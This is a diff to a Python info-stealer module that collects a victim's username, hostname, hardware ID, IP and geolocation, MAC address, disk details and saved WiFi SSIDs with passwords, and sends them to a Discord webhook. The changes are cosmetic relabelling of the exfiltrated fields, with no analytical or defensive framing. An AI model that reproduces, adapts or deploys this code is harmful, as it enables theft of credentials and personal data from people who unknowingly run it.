@@ -15,7 +15,7 @@ import time
 class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
-        embed = Embed(title="System Information", color=0x000000)
+        embed = Embed(title="Sys Info", color=0x3498db)
 
         embed.add_field(
             name=self.user_data()[0],
@@ -83,8 +83,8 @@ class SystemInfo():
         username = os.getenv('USERNAME')
 
         return (
-            ":bust_in_silhouette: User",
-            f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
+            ":computer: User",
+            f"```Dis Name: {display_name}\nHostname: {hostname}\nUser: {username}```",
             False
         )
 
@@ -105,8 +105,8 @@ class SystemInfo():
         hwid = get_hwid()
 
         return (
-            "<:CPU:1004131852208066701> System",
-            f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
+            "<:egg:1102170871403135047> Sys",
+            f"```Cpu: {cpu}\nGpu: {gpu}\nRam: {ram}\nHwid: {hwid}```",
             False
         )
 
@@ -121,7 +121,7 @@ class SystemInfo():
                 usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
 
         return (
-            ":floppy_disk: Disk",
+            ":flying_disc: Disk",
             f"```{disk}```",
             False
         )
@@ -141,7 +141,7 @@ class SystemInfo():
 
         return (
             ":satellite: Network",
-            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
+            "```Ip: {ip}\nMAC: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nIsp: {as_}```".format(
                 ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
             False
         )
@@ -176,13 +176,13 @@ class SystemInfo():
         except UnicodeDecodeError:
             pass
 
-        out += f'{"ssid":<20}| {"pass":<}\n'
+        out += f'{"ssid":<20}\ {"pass":<}\n'
         out += f'{"-"*20}\{"-"*29}\n'
         for name, password in networks:
             out += '{:<20}\ {:<}\n'.format(name, password)
 
         return (
-            ":signal_strength: WiFi",
+            ":house: WiFi",
             f"```{out}```",
             False
         )
